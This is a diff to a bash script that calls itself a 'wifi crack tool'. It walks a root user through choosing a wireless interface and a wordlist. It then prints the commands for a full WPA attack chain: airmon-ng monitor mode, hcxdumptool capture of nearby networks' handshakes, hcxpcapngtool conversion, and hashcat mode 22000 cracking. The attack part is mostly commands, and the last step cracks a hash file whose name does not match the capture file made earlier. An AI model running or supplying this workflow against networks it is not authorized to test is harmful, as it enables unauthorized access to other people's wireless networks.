@@ -46,18 +46,87 @@ function box () {
 	echo "${GREEN}"
   	echo "| ${b//?/ } |
  -${b//?/-}-"
-  	tput sgr 0
+  	tput sgr 0m
+  	echo
 } 
 
+echo "#########BANNER TODO##########"
+echo
+
 if [ "$EUID" -ne 0 ]
-  then echo "${YELLOW}[${RED}!${YELLOW}] ${RED} Error: this script must be run as ${YELLOW}root" 
+  then 
+  echo "${YELLOW}[${RED}!${YELLOW}] ${RED} Error: this script must be run as ${YELLOW}root" 
+  echo "${YELLOW}[${RED}!${YELLOW}] ${RED} Re-run with ${YELLOW}sudo" 
   exit
 fi
 
+#box "${YELLOW}[-] ${GREEN}Hi, welcome to the wifi crack tool"
 echo
-box "${YELLOW}[-] ${GREEN}Hi, welcome to the wifi crack tool"
+echo
+box "${YELLOW}[-] ${GREEN} Write the name of the interface:"
+echo "${YELLOW}"
+ip link show | awk '{print $2}'
+echo "${GREEN}_______________"
+read -r -p "${ITALIC_BLUE}--> ${NC}" INTERFACE
+echo
+while true; do #You sure while (y/n)
+	echo "${ITALIC_BLUE}# The entered interface is: ${RED} $INTERFACE ${YELLOW}" 
+	ip link show | grep -A1 $INTERFACE
+	read -r -p "${ITALIC_BLUE}# Are you sure? [y/N] ${NC}" response_interface 
+	case "$response_interface" in 
+		[yY]) #Sure
+		break 
+		;; 
+		[nN]) #Not sure
+			echo "${YELLOW}" 
+			echo "${ITALIC_BLUE}# Retype the interface: ${NC}" 
+			echo
+			read -r -p "${ITALIC_BLUE}--> ${NC}" INTERFACE
+		;;
+		* ) #Default
+			echo "${RED}! Please type only Yy or Nn${NC}" 
+ 			echo 
+		;;
+	esac 
+done #End sure while (y/n)
 
-echo "Select the interface"
+echo ${NC}
+echo "airmon-ng start $INTERFACE"
 
+echo
+box "${YELLOW}[-] ${GREEN} Let's start the dump of the wifi network around you. Press ${YELLOW}CTRL-C${GREEN} when you have finished"
+now=$(date +"%Y-%m-%d")
+echo "hcxdumptool -i $INTERFACE -o $now.pcapng --active_beacon --enable_status=15"
 
+echo
+box "${YELLOW}[-] ${GREEN} Let's decypt the captured pcap file"
+echo "hcxpcapngtool -o $now.hc22000 -E essidlist$now $now.pcapng"
 
+echo
+box "${YELLOW}[-] ${GREEN} Enter the absolute path of the wordlist:"
+read -r -p "${ITALIC_BLUE}--> ${NC}" WORDLISTPATH
+
+echo
+while true; do #You sure while (y/n)
+	echo "${ITALIC_BLUE}# The entered path is: ${RED} $WORDLISTPATH" 
+	ls -lha $WORDLISTPATH
+	read -r -p "${ITALIC_BLUE}# Are you sure? [y/N] ${NC}" response_path 
+	case "$response_path" in 
+		[yY]) #Sure
+		break 
+		;; 
+		[nN]) #Not sure
+			echo
+			echo "${ITALIC_BLUE}# Retype the wordlist path: ${NC}" 
+			echo
+			read -r -p "${ITALIC_BLUE}--> ${NC}" WORDLISTPATH
+		;;
+		* ) #Default
+			echo "${RED}! Please type only Yy or Nn${NC}" 
+ 			echo 
+		;;
+	esac 
+done #End sure while (y/n)
+	
+box "${YELLOW}-] ${GREEN} Crack the captured hc22000 handshake"
+echo "hashcat -m 22000 hash.hc22000 $WORDLISTPATH"
